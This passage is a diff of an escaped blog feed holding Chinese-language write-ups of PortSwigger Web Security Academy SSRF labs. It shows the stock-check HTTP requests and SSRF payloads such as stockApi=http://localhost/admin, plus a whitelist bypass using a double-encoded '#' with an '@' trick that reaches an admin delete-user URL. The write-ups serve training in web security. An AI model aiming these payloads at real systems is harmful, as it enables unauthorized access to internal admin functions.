+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">&amp;#34;External stock check host must be stock.weliketoshop.net&amp;#34;&lt;/span>
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="3">
 &lt;li>最终尝试到请求体为&lt;code>http://localhost%2523@stock.weliketoshop.net/admin&lt;/code>，将请求体修改并发送后得知删除用户&lt;code>carlos&lt;/code>的url为&lt;code>http://localhost%2523@stock.weliketoshop.net/admin/delete?username=carlos&lt;/code>，将请求体修改为此url后即可达成目的&lt;/li>
 &lt;/ol></content></item><item><title>[Write Up]Lab: SSRF with blacklist-based input filter</title><link>/posts/ssrf-lab-ssrf-with-blacklist-filter/</link><pubDate>Sat, 30 Nov 2024 14:51:44 +0800</pubDate><guid>/posts/ssrf-lab-ssrf-with-blacklist-filter/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
@@ -93,26 +206,26 @@
 &lt;li>点击任一个商品(View details)进入到商品详细页面，每个页面最底下有题目中提到的查看库存功能，点击按钮后可以查看不同地区的库存情况&lt;img alt="stock check feature" src="/img/ssrf-lab-basic-ssrf-against-localhost-2.jpg">&lt;/li>
 &lt;li>查看库存对应的请求内容与返回如下&lt;/li>
 &lt;/ol>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-html" data-lang="html">&lt;span style="display:flex;">&lt;span>POST /product/stock HTTP/2
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host: 0a82001403d00c83834cf749008e00de.web-security-academy.net
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Type: application/x-www-form-urlencoded
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Length: 107
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /product/stock &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">0a82001403d00c83834cf749008e00de.web-security-academy.net&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Type&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">application/x-www-form-urlencoded&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Length&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">107&lt;/span>
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>stockApi=http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D2%26storeId%3D1
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-html" data-lang="html">&lt;span style="display:flex;">&lt;span>HTTP/2 200 OK
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Type: text/plain; charset=utf-8
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>X-Frame-Options: SAMEORIGIN
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Length: 3
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">200&lt;/span> &lt;span style="color:#a6e22e">OK&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Type&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">text/plain; charset=utf-8&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>X-Frame-Options&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">SAMEORIGIN&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Length&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">3&lt;/span>
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>831
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">831&lt;/span>
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="3">
 &lt;li>观察上述请求与返回，可以猜测后端逻辑为请求&lt;code>http://stock.weliketoshop.net:8080&lt;/code>并带上对应参数后将库存数量返回&lt;/li>
 &lt;li>修改&lt;code>stockApi&lt;/code>参数值为题目要求的&lt;code>http://localhost/admin&lt;/code>&lt;/li>
 &lt;/ol>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-html" data-lang="html">&lt;span style="display:flex;">&lt;span>POST /product/stock HTTP/2
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host: 0a82001403d00c83834cf749008e00de.web-security-academy.net
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Type: application/x-www-form-urlencoded
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Length: 107
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /product/stock &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">0a82001403d00c83834cf749008e00de.web-security-academy.net&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Type&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">application/x-www-form-urlencoded&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Length&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">107&lt;/span>
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>stockApi=http://localhost/admin
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="5">
